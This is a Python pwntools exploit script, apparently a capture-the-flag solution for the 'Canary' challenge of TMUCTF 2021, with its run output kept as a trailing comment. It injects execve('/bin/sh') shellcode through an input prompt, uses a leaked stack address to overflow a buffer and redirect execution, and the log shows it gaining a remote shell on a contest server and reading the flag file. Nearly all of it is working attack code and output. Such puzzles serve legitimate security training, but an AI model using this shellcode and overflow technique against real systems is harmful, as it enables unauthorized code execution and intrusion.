from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './canary'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "185.97.117.19"
  PORT = 7030
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

shellcode0 = asm('''
  xor    edx, edx
  push   rsp
  pop    rdi
  sub    di, 0x1c
  push   rdx
  pop    rsi
  push   0x3b
  pop    rax
  syscall
  ''')
shellcode1 = asm('''
  push   rax
  push   rsp
  pop    rdi
  push   rdx
  pop    rsi
  push   0x3b
  pop    rax
  syscall
  ''')

s.recvuntil("Enter first string (up to 15 chars): \n")
s.sendline(shellcode0)

s.recvuntil("Enter second string (up to 15 chars): \n")
s.sendline("A"*8)

s.recvuntil("Here is the canary address: ")
stack_leak = int(s.recvuntil("\n"), 16)
print "stack_leak =", hex(stack_leak)

s.recvuntil("Enter your phone number: \n")
buf  = "/bin/sh\x00"
buf += "B"*(20 - len(buf))
buf += p64(stack_leak + 12)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/TMUCTF_2021/Pwn_Canary$ python solve.py r
[*] '/home/mito/CTF/TMUCTF_2021/Pwn_Canary/canary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 185.97.117.19 on port 7030: Done
stack_leak = 0x7ffd211cc0d1
[*] Switching to interactive mode

This is the comparison result: 
---> * The strings are not equal! *
$ id
sh: 1: id: not found
$ ls -l
total 48
drwxr-x--- 1 0 1000  4096 Sep  7 06:44 bin
-rwxr-x--- 1 0 1000 17184 Sep  5 07:36 canary
drwxr-x--- 1 0 1000  4096 Sep  7 06:44 dev
-rwxr----- 1 0 1000    42 Sep  7 06:38 flag.txt
drwxr-x--- 1 0 1000  4096 Sep  7 06:44 lib
drwxr-x--- 1 0 1000  4096 Sep  7 06:44 lib32
drwxr-x--- 1 0 1000  4096 Sep  7 06:44 lib64
drwxr-x--- 1 0 1000  4096 Sep  7 06:44 libx32
$ cat flag.txt
TMUCTF{3x3cu74bl3_574ck_15_v3ry_d4n63r0u5}
'''
